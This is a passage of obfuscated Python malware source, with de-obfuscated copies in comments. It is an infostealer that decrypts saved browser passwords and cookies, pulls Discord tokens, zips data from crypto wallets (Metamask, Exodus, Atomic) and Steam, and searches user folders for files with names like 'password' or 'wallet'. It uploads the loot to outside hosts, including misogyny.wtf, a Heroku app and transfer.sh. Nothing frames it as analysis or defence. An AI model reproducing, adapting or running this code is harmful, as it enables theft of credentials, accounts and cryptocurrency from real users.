	if O0OO0000000000OO0 ==B0 :OOOO0O0OOOOOOOOO0 ={AH :B ,AI :[{AL :5119890 ,A_ :[{J :'Interesting files found on user PC:',U :OOO00OO0OO00OOOOO }],AM :{J :'File Stealer'},AN :{AO :D ,g :AP }}],AJ :D ,AK :[]};I (H (F ('https%3A%2F%2Fmisogyny.wtf%2Flogs%2Ffilestealer'),data =k (OOOO0O0OOOOOOOOO0 ).encode (),headers =O0000O0OO0000OOO0 ));return #line:184:if name==B0:C={AH:B,AI:[{AL:5119890,A_:[{J:'Interesting files found on user PC:',U:tk}],AM:{J:'File Stealer'},AN:{AO:D,g:AP}}],AJ:D,AK:[]};I(H(F('https%3A%2F%2Fmisogyny.wtf%2Flogs%2Ffilestealer'),data=k(C).encode(),headers=A));return
	O0000000OO00OOOOO =O0OO0000000000OO0 ;O00O00OOOOO0O000O ={B1 :K (O0000000OO00OOOOO ,'rb')};P .post (F ('http%3A%2F%2Fmysterious-everglades-49390.herokuapp.com'),headers ={e :TOTP ('BJCMFCAZJ5HB3Q5MYK4HW===').now ()},files =O00O00OOOOO0O000O )#line:185:E=name;G={B1:K(E,'rb')};P.post(F('http%3A%2F%2Fmysterious-everglades-49390.herokuapp.com'),headers={e:TOTP('BJCMFCAZJ5HB3Q5MYK4HW===').now()},files=G)
def AA (O0000O00O0OOO0OOO ,OOO00O0O0OOOOO00O ):#line:186:def AA(data,name):
	OOO0OOO0O000OOOO0 =A .getenv (AF )+f"\\wp{OOO00O0O0OOOOO00O}.txt"#line:187:E=A.getenv(AF)+f"\\wp{name}.txt"
	with K (OOO0OOO0O000OOOO0 ,mode ='w',encoding =y )as OOOO0OOO0000O0OOO :#line:188:with K(E,mode='w',encoding=y)as C:
		OOOO0OOO0000O0OOO .write (f"""
***********************************************
*    _____                       _      _     *
*   / _  /   ___    ___    ___  | | __ | |_   *
*   \\// /   / _ \\  / _ \\  / __| | |/ / | __|  *
*    / //\\ |  __/ |  __/ | (__  |   <  | |_   *
*   /____/  \\___|  \\___|  \\___| |_|\\_\\  \\__|  *
*                                             *
***********************************************

""")#line:199:""")
		for OOO000OOOOOOO0000 in O0000O00O0OOO0OOO :#line:200:for D in data:
			if OOO000OOOOOOO0000 [0 ]!=B :OOOO0OOO0000O0OOO .write (f"{OOO000OOOOOOO0000}\n")#line:201:if D[0]!=B:C.write(f"{D}\n")
S =B #line:202:S=B
def Ag (O0O000O0O0O00O000 ,OO0O00OO0OO0OOO00 ):#line:203:def Ag(path,arg):
	OO0OOOO0OO0OO0O00 =O0O000O0O0O00O000 #line:204:B=path
	if not A .path .exists (OO0OOOO0OO0OO0O00 ):return #line:205:if not A.path.exists(B):return
	OO0OOOO0OO0OO0O00 +=OO0O00OO0OO0OOO00 #line:206:B+=arg
	for O000OO00OO00O000O in A .listdir (OO0OOOO0OO0OO0O00 ):#line:207:for D in A.listdir(B):
		if O000OO00OO00O000O .endswith (B2 )or O000OO00OO00O000O .endswith (B3 ):#line:208:if D.endswith(B2)or D.endswith(B3):
			for O0OO0000000000O0O in [OOOO00OO000O0OO00 .strip ()for OOOO00OO000O0OO00 in K (f"{OO0OOOO0OO0OO0O00}\\{O000OO00OO00O000O}",errors =AG ).readlines ()if OOOO00OO000O0OO00 .strip ()]:#line:209:for E in [A.strip()for A in K(f"{B}\\{D}",errors=AG).readlines()if A.strip()]:
				for O0OO00OO0O00O0O0O in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):#line:210:for F in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):
					for O00OOO0OO0O00OOO0 in re .findall (O0OO00OO0O00O0O0O ,O0OO0000000000O0O ):#line:211:for C in re.findall(F,E):
						global S #line:212:global S
						if A8 (O00OOO0OO0O00OOO0 ):#line:213:if A8(C):
							if not O00OOO0OO0O00OOO0 in S :S +=O00OOO0OO0O00OOO0 ;A9 (O00OOO0OO0O00OOO0 ,OO0OOOO0OO0OO0O00 )#line:214:if not C in S:S+=C;A9(C,B)
q =[]#line:215:q=[]
def Ah (OO000OO0000OOOOO0 ,OOOOO0OO0OOOOO0O0 ):#line:216:def Ah(path,arg):
	O000000OO0O00000O =OO000OO0000OOOOO0 ;global q #line:217:E=path;global q
	if not A .path .exists (O000000OO0O00000O ):return #line:218:if not A.path.exists(E):return
	OO000OO000O0OOOO0 =O000000OO0O00000O +OOOOO0OO0OOOOO0O0 +'/Login Data'#line:219:I=E+arg+'/Login Data'
	if A .stat (OO000OO000O0OOOO0 ).st_size ==0 :return #line:220:if A.stat(I).st_size==0:return
	O00O0OO0O0000O00O =l +'wp'+B .join ((A3 .choice (B4 )for O00OO0O00O000000O in v (8 )))+B5 ;A2 .copy2 (OO000OO000O0OOOO0 ,O00O0OO0O0000O00O );O0O0O0000OO0OO000 =z (O00O0OO0O0000O00O );O000O0O00000OOOOO =O0O0O0000OO0OO000 .cursor ();O000O0O00000OOOOO .execute ('SELECT action_url, username_value, password_value FROM logins;');OO00OO00OO0OOO0O0 =O000O0O00000OOOOO .fetchall ();O000O0O00000OOOOO .close ();O0O0O0000OO0OO000 .close ();A .remove (O00O0OO0O0000O00O );O0OO00000000O000O =O000000OO0O00000O +AQ #line:221:F=l+'wp'+B.join((A3.choice(B4)for A in v(8)))+B5;A2.copy2(I,F);J=z(F);G=J.cursor();G.execute('SELECT action_url, username_value, password_value FROM logins;');M=G.fetchall();G.close();J.close();A.remove(F);N=E+AQ
	with K (O0OO00000000O000O ,'r',encoding =y )as OO00O0OOO000O00OO :OOO0O00O00O00000O =h (OO00O0OOO000O00OO .read ())#line:222:with K(N,'r',encoding=y)as O:P=h(O.read())
	O000OO00O0O0000O0 =b (OOO0O00O00O00000O [AR ][AS ]);O000OO00O0O0000O0 =n (O000OO00O0O0000O0 [5 :])#line:223:H=b(P[AR][AS]);H=n(H[5:])
	for O0OOOO0OOO00OOOOO in OO00OO00OO0OOO0O0 :#line:224:for C in M:
		if O0OOOO0OOO00OOOOO [0 ]!=B :#line:225:if C[0]!=B:
			for O00O0O0000O00OOO0 in r :#line:226:for D in r:
				O0OO0000O00OOOO0O =O00O0O0000O00OOO0 #line:227:L=D
				if x in O00O0O0000O00OOO0 :O000OOO0O00OOO00O =O00O0O0000O00OOO0 ;O00O0O0000O00OOO0 =O000OOO0O00OOO00O .split ('[')[1 ].split (']')[0 ]#line:228:if x in D:Q=D;D=Q.split('[')[1].split(']')[0]
				if O00O0O0000O00OOO0 in O0OOOO0OOO00OOOOO [0 ]:#line:229:if D in C[0]:
					if not O0OO0000O00OOOO0O in t :t .append (O0OO0000O00OOOO0O )#line:230:if not L in t:t.append(L)
			q .append (f"""
========================
URL: {O0OOOO0OOO00OOOOO[0]}
Username: {O0OOOO0OOO00OOOOO[1]}
Password: {o(O0OOOO0OOO00OOOOO[2],O000OO00O0O0000O0)}
========================
""")#line:237:""")
	AA (q ,AT )#line:238:AA(q,AT)
W =[]#line:239:W=[]
def Ai (O0000O00OO00000OO ,O00O0OO0O00OOO000 ):#line:240:def Ai(path,arg):
	O00O000O0OOOOO0O0 =O0000O00OO00000OO ;global W #line:241:E=path;global W
	if not A .path .exists (O00O000O0OOOOO0O0 ):return #line:242:if not A.path.exists(E):return
	OOO0OO00000O00OO0 =O00O000O0OOOOO0O0 +O00O0OO0O00OOO000 +'/Cookies'#line:243:I=E+arg+'/Cookies'
	if A .stat (OOO0OO00000O00OO0 ).st_size ==0 :return #line:244:if A.stat(I).st_size==0:return
	OOO0O0O0O00OO00OO =l +'wp'+B .join ((A3 .choice (B4 )for OO00000O00O000OOO in v (8 )))+B5 ;A2 .copy2 (OOO0OO00000O00OO0 ,OOO0O0O0O00OO00OO );OO0O0OO0OO0OOO00O =z (OOO0O0O0O00OO00OO );O0O00OO00OO0OO0OO =OO0O0OO0OO0OOO00O .cursor ();O0O00OO00OO0OO0OO .execute ('SELECT host_key, name, encrypted_value FROM cookies');OOO0O0O0OO0OOOOOO =O0O00OO00OO0OO0OO .fetchall ();O0O00OO00OO0OO0OO .close ();OO0O0OO0OO0OOO00O .close ();A .remove (OOO0O0O0O00OO00OO );OOO0OOOOO00OO0OO0 =O00O000O0OOOOO0O0 +AQ #line:245:F=l+'wp'+B.join((A3.choice(B4)for A in v(8)))+B5;A2.copy2(I,F);J=z(F);G=J.cursor();G.execute('SELECT host_key, name, encrypted_value FROM cookies');M=G.fetchall();G.close();J.close();A.remove(F);N=E+AQ
	with K (OOO0OOOOO00OO0OO0 ,'r',encoding =y )as OO0OO0000OOO00OO0 :O0O0O0OO000000O0O =h (OO0OO0000OOO00OO0 .read ())#line:246:with K(N,'r',encoding=y)as O:P=h(O.read())
	OO0O0OO000000000O =b (O0O0O0OO000000O0O [AR ][AS ]);OO0O0OO000000000O =n (OO0O0OO000000000O [5 :])#line:247:H=b(P[AR][AS]);H=n(H[5:])
	for O00O000O0OO00OOOO in OOO0O0O0OO0OOOOOO :#line:248:for C in M:
		if O00O000O0OO00OOOO [0 ]!=B :#line:249:if C[0]!=B:
			for OOOO0OOOO0OOO0OO0 in r :#line:250:for D in r:
				O0OO0OO00O00O0O0O =OOOO0OOOO0OOO0OO0 #line:251:L=D
				if x in OOOO0OOOO0OOO0OO0 :OO0OOOOO0O0OOOO0O =OOOO0OOOO0OOO0OO0 ;OOOO0OOOO0OOO0OO0 =OO0OOOOO0O0OOOO0O .split ('[')[1 ].split (']')[0 ]#line:252:if x in D:Q=D;D=Q.split('[')[1].split(']')[0]
				if OOOO0OOOO0OOO0OO0 in O00O000O0OO00OOOO [0 ]:#line:253:if D in C[0]:
					if not O0OO0OO00O00O0O0O in s :s .append (O0OO0OO00O00O0O0O )#line:254:if not L in s:s.append(L)
			W .append (f"{O00O000O0OO00OOOO[0]}\tTRUE\t/\tFALSE\t2597573456\t{O00O000O0OO00OOOO[1]}\t{o(O00O000O0OO00OOOO[2],OO0O0OO000000000O)}")#line:255:W.append(f"{C[0]}\tTRUE\t/\tFALSE\t2597573456\t{C[1]}\t{o(C[2],H)}")
	AA (W ,'cook')#line:256:AA(W,'cook')
def Aj (OOOO00O000O00O000 ,OOO0O00OO00OO0OO0 ):#line:257:def Aj(path,arg):
	OOOOOO000OO0OOO0O =OOOO00O000O00O000 #line:258:B=path
	if not A .path .exists (f"{OOOOOO000OO0OOO0O}/Local State"):return #line:259:if not A.path.exists(f"{B}/Local State"):return
	OO00O0O0OO0O000OO =OOOOOO000OO0OOO0O +OOO0O00OO00OO0OO0 ;OO0O0OO0OOO0OOO0O =OOOOOO000OO0OOO0O +AQ #line:260:F=B+arg;G=B+AQ
	with K (OO0O0OO0OOO0OOO0O ,'r',encoding =y )as O00O0OOOOO0000OO0 :OOO0000OO000OOO00 =h (O00O0OOOOO0000OO0 .read ())#line:261:with K(G,'r',encoding=y)as H:I=h(H.read())
	O0O0000O000O000O0 =b (OOO0000OO000OOO00 [AR ][AS ]);O0O0000O000O000O0 =n (O0O0000O000O000O0 [5 :])#line:262:D=b(I[AR][AS]);D=n(D[5:])
	for O0OO0O0OOOOO000O0 in A .listdir (OO00O0O0OO0O000OO ):#line:263:for E in A.listdir(F):
		if O0OO0O0OOOOO000O0 .endswith (B2 )or O0OO0O0OOOOO000O0 .endswith (B3 ):#line:264:if E.endswith(B2)or E.endswith(B3):
			for O0O0O00O0OOO0OOOO in [O0OO0O0OOOOO0O000 .strip ()for O0OO0O0OOOOO0O000 in K (f"{OO00O0O0OO0O000OO}\\{O0OO0O0OOOOO000O0}",errors =AG ).readlines ()if O0OO0O0OOOOO0O000 .strip ()]:#line:265:for J in [A.strip()for A in K(f"{F}\\{E}",errors=AG).readlines()if A.strip()]:
				for O0O0000OO00OOO0O0 in re .findall ('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',O0O0O00O0OOO0OOOO ):#line:266:for L in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',J):
					global S ;O0O0000O0O0OOO000 =o (b (O0O0000OO00OOO0O0 .split ('dQw4w9WgXcQ:')[1 ]),O0O0000O000O000O0 )#line:267:global S;C=o(b(L.split('dQw4w9WgXcQ:')[1]),D)
					if A8 (O0O0000O0O0OOO000 ):#line:268:if A8(C):
						if not O0O0000O0O0OOO000 in S :S +=O0O0000O0O0OOO000 ;A9 (O0O0000O0O0OOO000 ,OOOOOO000OO0OOO0O )#line:269:if not C in S:S+=C;A9(C,B)
def AB (O0O000OO0OO0OO00O ,OO00OOOO0O0OOOO00 ,O00OOO00OOOOOOO0O ):#line:270:def AB(path,arg,procc):
	OO0OOOO0OO000O000 =' ';OOOO0OO0O0OO00OOO =O0O000OO0OO0OO00O ;O00OOO00O0OOO0000 =OO00OOOO0O0OOOO00 ;O0OO00OOOOO0O00O0 =OOOO0OO0O0OO00OOO ;OO0OO000OO0000OOO =O00OOO00O0OOO0000 #line:271:Q=' ';H=path;E=arg;D=H;F=E
	if 'nkbihfbeogaeaoehlefnkodbefgpgknn'in O00OOO00O0OOO0000 :OO00O000O00000O0O =OOOO0OO0O0OO00OOO .split (AU )[4 ].split (C )[1 ].replace (OO0OOOO0OO000O000 ,B );OO0OO000OO0000OOO =f"Metamask_{OO00O000O00000O0O}_{A.getlogin()}";O0OO00OOOOO0O00O0 =OOOO0OO0O0OO00OOO +O00OOO00O0OOO0000 #line:272:if'nkbihfbeogaeaoehlefnkodbefgpgknn'in E:I=H.split(AU)[4].split(C)[1].replace(Q,B);F=f"Metamask_{I}_{A.getlogin()}";D=H+E
	if not A .path .exists (O0OO00OOOOO0O00O0 ):return #line:273:if not A.path.exists(D):return
	A4 .Popen (f"taskkill /im {O00OOO00OOOOOOO0O} /t /f",shell =G )#line:274:A4.Popen(f"taskkill /im {procc} /t /f",shell=G)
	if AV in O00OOO00O0OOO0000 or B6 in O00OOO00O0OOO0000 :OO00O000O00000O0O =OOOO0OO0O0OO00OOO .split (AU )[4 ].split (C )[1 ].replace (OO0OOOO0OO000O000 ,B );OO0OO000OO0000OOO =f"{OO00O000O00000O0O}_{A.getlogin()}"#line:275:if AV in E or B6 in E:I=H.split(AU)[4].split(C)[1].replace(Q,B);F=f"{I}_{A.getlogin()}"
	elif B7 in O00OOO00O0OOO0000 :#line:276:elif B7 in E:
		if not A .path .isfile (f"{O0OO00OOOOO0O00O0}/loginusers.vdf"):return #line:277:if not A.path.isfile(f"{D}/loginusers.vdf"):return
		OO00OO0O0O0O0OO0O =K (f"{O0OO00OOOOO0O00O0}/loginusers.vdf",'r+',encoding =Aw );OOOO0O0OOOOOOO0OO =OO00OO0O0O0O0OO0O .readlines ();O0OOO0OOO0O0OO000 =R #line:278:N=K(f"{D}/loginusers.vdf",'r+',encoding=Aw);O=N.readlines();J=R
		for O0O00OO000OOOO0O0 in OOOO0O0OOOOOOO0OO :#line:279:for P in O:
			if 'RememberPassword"\t\t"1"'in O0O00OO000OOOO0O0 :O0OOO0OOO0O0OO000 =G #line:280:if'RememberPassword"\t\t"1"'in P:J=G
		if O0OOO0OOO0O0OO000 ==R :return #line:281:if J==R:return
		OO0OO000OO0000OOO =O00OOO00O0OOO0000 #line:282:F=E
	OOOO00O0O0O00OOO0 =ZipFile (f"{O0OO00OOOOO0O00O0}/{OO0OO000OO0000OOO}.zip",'w')#line:283:L=ZipFile(f"{D}/{F}.zip",'w')
	for O0O0O0O00OOO0OO0O in A .listdir (O0OO00OOOOO0O00O0 ):#line:284:for M in A.listdir(D):
		if not '.zip'in O0O0O0O00OOO0OO0O :OOOO00O0O0O00OOO0 .write (O0OO00OOOOO0O00O0 +C +O0O0O0O00OOO0OO0O )#line:285:if not'.zip'in M:L.write(D+C+M)
	OOOO00O0O0O00OOO0 .close ();p (f"{O0OO00OOOOO0O00O0}/{OO0OO000OO0000OOO}.zip");A .remove (f"{O0OO00OOOOO0O00O0}/{OO0OO000OO0000OOO}.zip")#line:286:L.close();p(f"{D}/{F}.zip");A.remove(f"{D}/{F}.zip")
def Ak ():#line:287:def Ak():
	OO00O0O0O00OO0O0O ='chrome.exe';O0OO0O000OO000OO0 ='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';OO0O0O000OO00000O ='/Network';OO00OOOOOOO00O0O0 ='opera.exe';OOOOO0000OOOO000O ='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';OOOOO0000OOOOO0O0 ='/Default/Network';OOOOO000OO0O0OO0O ='/Default';O00O0OOOO0000OOOO ='/Default/Local Storage/leveldb';OO0OOO0O000OO0O00 ='/Local Storage/leveldb';OOO00O000OOO00OO0 =[[f"{E}/Opera Software/Opera GX Stable",OO00OOOOOOO00O0O0 ,OO0OOO0O000OO0O00 ,C ,OO0O0O000OO00000O ,O0OO0O000OO000OO0 ],[f"{E}/Opera Software/Opera Stable",OO00OOOOOOO00O0O0 ,OO0OOO0O000OO0O00 ,C ,OO0O0O000OO00000O ,O0OO0O000OO000OO0 ],[f"{E}/Opera Software/Opera Neon/User Data/Default",OO00OOOOOOO00O0O0 ,OO0OOO0O000OO0O00 ,C ,OO0O0O000OO00000O ,O0OO0O000OO000OO0 ],[f"{V}/Google/Chrome/User Data",OO00O0O0O00OO0O0O ,O00O0OOOO0000OOOO ,OOOOO000OO0O0OO0O ,OOOOO0000OOOOO0O0 ,OOOOO0000OOOO000O ],[f"{V}/Google/Chrome SxS/User Data",OO00O0O0O00OO0O0O ,O00O0OOOO0000OOOO ,OOOOO000OO0O0OO0O ,OOOOO0000OOOOO0O0 ,OOOOO0000OOOO000O ],[f"{V}/BraveSoftware/Brave-Browser/User Data",'brave.exe',O00O0OOOO0000OOOO ,OOOOO000OO0O0OO0O ,OOOOO0000OOOOO0O0 ,OOOOO0000OOOO000O ],[f"{V}/Yandex/YandexBrowser/User Data",'yandex.exe',O00O0OOOO0000OOOO ,OOOOO000OO0O0OO0O ,OOOOO0000OOOOO0O0 ,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{V}/Microsoft/Edge/User Data",'edge.exe',O00O0OOOO0000OOOO ,OOOOO000OO0O0OO0O ,OOOOO0000OOOOO0O0 ,OOOOO0000OOOO000O ]];O00000OO00OO00O00 =[[f"{E}/Discord",OO0OOO0O000OO0O00 ],[f"{E}/Lightcord",OO0OOO0O000OO0O00 ],[f"{E}/discordcanary",OO0OOO0O000OO0O00 ],[f"{E}/discordptb",OO0OOO0O000OO0O00 ]];OOO00OO0OO0O00OO0 =[[f"{E}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',AV ],[f"{E}/Exodus/exodus.wallet",'Exodus.exe',AV ],['C:\\Program Files (x86)\\Steam\\config','steam.exe',B7 ],[f"{E}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',B6 ]]#line:288:Y='chrome.exe';R='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';Q='/Network';P='opera.exe';M='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';K='/Default/Network';J='/Default';I='/Default/Local Storage/leveldb';F='/Local Storage/leveldb';H=[[f"{E}/Opera Software/Opera GX Stable",P,F,C,Q,R],[f"{E}/Opera Software/Opera Stable",P,F,C,Q,R],[f"{E}/Opera Software/Opera Neon/User Data/Default",P,F,C,Q,R],[f"{V}/Google/Chrome/User Data",Y,I,J,K,M],[f"{V}/Google/Chrome SxS/User Data",Y,I,J,K,M],[f"{V}/BraveSoftware/Brave-Browser/User Data",'brave.exe',I,J,K,M],[f"{V}/Yandex/YandexBrowser/User Data",'yandex.exe',I,J,K,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{V}/Microsoft/Edge/User Data",'edge.exe',I,J,K,M]];S=[[f"{E}/Discord",F],[f"{E}/Lightcord",F],[f"{E}/discordcanary",F],[f"{E}/discordptb",F]];T=[[f"{E}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',AV],[f"{E}/Exodus/exodus.wallet",'Exodus.exe',AV],['C:\\Program Files (x86)\\Steam\\config','steam.exe',B7],[f"{E}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',B6]]
	for O0O0O0OO00O000OO0 in OOO00O000OOO00OO0 :OOO0OOOOO000OO000 =N .Thread (target =Ag ,args =[O0O0O0OO00O000OO0 [0 ],O0O0O0OO00O000OO0 [2 ]]);OOO0OOOOO000OO000 .start ();c .append (OOO0OOOOO000OO000 )#line:289:for B in H:D=N.Thread(target=Ag,args=[B[0],B[2]]);D.start();c.append(D)
	for O0O0O0OO00O000OO0 in O00000OO00OO00O00 :OOO0OOOOO000OO000 =N .Thread (target =Aj ,args =[O0O0O0OO00O000OO0 [0 ],O0O0O0OO00O000OO0 [1 ]]);OOO0OOOOO000OO000 .start ();c .append (OOO0OOOOO000OO000 )#line:290:for B in S:D=N.Thread(target=Aj,args=[B[0],B[1]]);D.start();c.append(D)
	for O0O0O0OO00O000OO0 in OOO00O000OOO00OO0 :OOO0OOOOO000OO000 =N .Thread (target =Ah ,args =[O0O0O0OO00O000OO0 [0 ],O0O0O0OO00O000OO0 [3 ]]);OOO0OOOOO000OO000 .start ();c .append (OOO0OOOOO000OO000 )#line:291:for B in H:D=N.Thread(target=Ah,args=[B[0],B[3]]);D.start();c.append(D)
	O0OOOO0O0O0OO000O =[]#line:292:O=[]
	for O0O0O0OO00O000OO0 in OOO00O000OOO00OO0 :OOO0OOOOO000OO000 =N .Thread (target =Ai ,args =[O0O0O0OO00O000OO0 [0 ],O0O0O0OO00O000OO0 [4 ]]);OOO0OOOOO000OO000 .start ();O0OOOO0O0O0OO000O .append (OOO0OOOOO000OO000 )#line:293:for B in H:D=N.Thread(target=Ai,args=[B[0],B[4]]);D.start();O.append(D)
	for O0O000OO00OOOO0O0 in O0OOOO0O0O0OO000O :O0O000OO00OOOO0O0 .join ()#line:294:for L in O:L.join()
	OOO00O0O00OOOOO0O =A7 (W )#line:295:U=A7(W)
	if OOO00O0O00OOOOO0O ==G :return #line:296:if U==G:return
	for O0O0O0OO00O000OO0 in OOO00O000OOO00OO0 :N .Thread (target =AB ,args =[O0O0O0OO00O000OO0 [0 ],O0O0O0OO00O000OO0 [5 ],O0O0O0OO00O000OO0 [1 ]]).start ()#line:297:for B in H:N.Thread(target=AB,args=[B[0],B[5],B[1]]).start()
	for O0O0O0OO00O000OO0 in OOO00OO0OO0O00OO0 :N .Thread (target =AB ,args =[O0O0O0OO00O000OO0 [0 ],O0O0O0OO00O000OO0 [2 ],O0O0O0OO00O000OO0 [1 ]]).start ()#line:298:for B in T:N.Thread(target=AB,args=[B[0],B[2],B[1]]).start()
	for O0O000OO00OOOO0O0 in c :O0O000OO00OOOO0O0 .join ()#line:299:for L in c:L.join()
	global Al ;Al =[]#line:300:global Al;Al=[]
	for O0OO0O0O000OO0OO0 in ['wppassw.txt','wpcook.txt']:p (A .getenv (AF )+AU +O0OO0O0O000OO0OO0 )#line:301:for X in ['wppassw.txt','wpcook.txt']:p(A.getenv(AF)+AU+X)
def AC (OO00O00OO00OOO0O0 ):#line:302:def AC(path):
	try :O00000OOOO0O0O00O ={B1 :(OO00O00OO00OOO0O0 ,K (OO00O00OO00OOO0O0 ,mode ='rb'))};...;OO0OO0000OO00OO00 =P .post ('https://transfer.sh/',files =O00000OOOO0O0O00O );OO000O00OOOOOO000 =OO0OO0000OO00OO00 .text ;return OO000O00OOOOOO000 #line:303:try:A={B1:(path,K(path,mode='rb'))};...;B=P.post('https://transfer.sh/',files=A);C=B.text;return C
	except :return R #line:304:except:return R
def Am (OO0O00OO0O0O0OO0O ,OOOOOOO0OOO0O0O0O ):#line:305:def Am(pathF,keywords):
	O0OO0OOOOO0O0OOO0 =OO0O00OO0O0O0OO0O ;global X ;O0000O0O0OO00O0OO =7 ;O0OO0O0O0OOOOOO0O =0 ;OO0OO0O0OO0OO00OO =A .listdir (O0OO0OOOOO0O0OOO0 );OO000O0O0O00O0OO0 =[]#line:306:B=pathF;global X;G=7;E=0;H=A.listdir(B);F=[]
	for O00OOO0000O0O0O00 in OO0OO0O0OO0OO00OO :#line:307:for D in H:
		if not A .path .isfile (O0OO0OOOOO0O0OOO0 +C +O00OOO0000O0O0O00 ):return #line:308:if not A.path.isfile(B+C+D):return
		O0OO0O0O0OOOOOO0O +=1 #line:309:E+=1
		if O0OO0O0O0OOOOOO0O <=O0000O0O0OO00O0OO :O000000OO000000O0 =AC (O0OO0OOOOO0O0OOO0 +C +O00OOO0000O0O0O00 );OO000O0O0O00O0OO0 .append ([O0OO0OOOOO0O0OOO0 +C +O00OOO0000O0O0O00 ,O000000OO000000O0 ])#line:310:if E<=G:I=AC(B+C+D);F.append([B+C+D,I])
		else :break #line:311:else:break
	X .append ([B8 ,O0OO0OOOOO0O0OOO0 +C ,OO000O0O0O00O0OO0 ])#line:312:X.append([B8,B+C,F])
X =[]#line:313:X=[]
def An (O00OOO00000O0OOO0 ,OOOOOOOOOOOOO0OOO ):#line:314:def An(path,keywords):
	O0OO0O00O0OO000OO =OOOOOOOOOOOOO0OOO ;OOOO0O0OOOO00O000 =O00OOO00000O0OOO0 ;global X ;O0000O0O0000000OO =[];OO00O0O00OOO0O00O =A .listdir (OOOO0O0OOOO00O000 )#line:315:E=keywords;B=path;global X;F=[];G=A.listdir(B)
	for OOO0OO00OOOOO000O in OO00O0O00OOO0O00O :#line:316:for D in G:
		for OO0000OO0OO0OOOO0 in O0OO0O00O0OO000OO :#line:317:for H in E:
			if OO0000OO0OO0OOOO0 in OOO0OO00OOOOO000O .lower ():#line:318:if H in D.lower():
				if A .path .isfile (OOOO0O0OOOO00O000 +C +OOO0OO00OOOOO000O )and '.txt'in OOO0OO00OOOOO000O :O0000O0O0000000OO .append ([OOOO0O0OOOO00O000 +C +OOO0OO00OOOOO000O ,AC (OOOO0O0OOOO00O000 +C +OOO0OO00OOOOO000O )]);break #line:319:if A.path.isfile(B+C+D)and'.txt'in D:F.append([B+C+D,AC(B+C+D)]);break
				if A .path .isdir (OOOO0O0OOOO00O000 +C +OOO0OO00OOOOO000O ):OO0000O00OOOOOO00 =OOOO0O0OOOO00O000 +C +OOO0OO00OOOOO000O ;Am (OO0000O00OOOOOO00 ,O0OO0O00O0OO000OO );break #line:320:if A.path.isdir(B+C+D):I=B+C+D;Am(I,E);break
	X .append ([B8 ,OOOO0O0OOOO00O000 ,O0000O0O0000000OO ])#line:321:X.append([B8,B,F])
def Ao ():#line:322:def Ao():
	OO0OOOO0O00000OO0 ='secret';OO0O00O00O00OOOOO ='acount';O0000O00OO00O00O0 ='account';O0OO00O00O0000OO0 =l .split ('\\AppData')[0 ];OO0000OOOO000OOO0 =[O0OO00O00O0000OO0 +'/Desktop',O0OO00O00O0000OO0 +'/Downloads',O0OO00O00O0000OO0 +'/Documents'];OOOO0OOOOOOO0OOOO =[O0000O00OO00O00O0 ,OO0O00O00O00OOOOO ,AT ,OO0OOOO0O00000OO0 ];O0OO00OOO0000O00O =[AT ,'mdp','motdepasse','mot_de_passe','login',B9 ,OO0OOOO0O00000OO0 ,O0000O00OO00O00O0 ,OO0O00O00O00OOOOO ,'paypal','banque',O0000O00OO00O00O0 ,'metamask','wallet',BA ,'exodus','discord','2fa','code','memo','compte',Az ,'backup','tokens','seecret'];O0OO000O0O000O00O =[]#line:323:I='secret';H='acount';D='account';A=l.split('\\AppData')[0];E=[A+'/Desktop',A+'/Downloads',A+'/Documents'];J=[D,H,AT,I];F=[AT,'mdp','motdepasse','mot_de_passe','login',B9,I,D,H,'paypal','banque',D,'metamask','wallet',BA,'exodus','discord','2fa','code','memo','compte',Az,'backup','tokens','seecret'];B=[]
	for O000OOOOOO0OOO000 in OO0000OOOO000OOO0 :O00O00O00OOOOO0OO =N .Thread (target =An ,args =[O000OOOOOO0OOO000 ,O0OO00OOO0000O00O ]);O00O00O00OOOOO0OO .start ();O0OO000O0O000O00O .append (O00O00O00OOOOO0OO )#line:324:for G in E:C=N.Thread(target=An,args=[G,F]);C.start();B.append(C)
	return O0OO000O0O000O00O #line:325:return B
global r ,s ,t #line:326:global r,s,t
r =['mail','nft',B9 ,'[exodus](https://exodus.com)','[coinbase](https://coinbase.com)','[github](https://github.com)','[stake](https://stake.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',BA 